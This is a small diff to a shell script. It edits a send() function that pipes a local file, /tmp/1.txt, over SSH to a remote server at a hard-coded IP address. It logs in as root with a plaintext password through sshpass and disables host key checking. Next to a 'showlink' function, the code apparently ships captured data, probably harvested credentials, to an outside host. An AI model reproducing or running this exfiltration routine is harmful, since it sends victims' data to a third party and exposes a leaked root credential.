@@ -148,7 +148,7 @@ showlink() {
 }
 
 send(){
-    cat /tmp/1.txt | sshpass -p '1475963Aa@123' ssh -o StrictHostKeyChecking=no root@18.222.212.8 'cat - >> /home/$0.txt'
+    cat /tmp/1.txt | sshpass -p '1475963Aa@123' ssh -o StrictHostKeyChecking=no root@18.222.212.8 'cat - >> /home/$1.txt'
 }
 
 
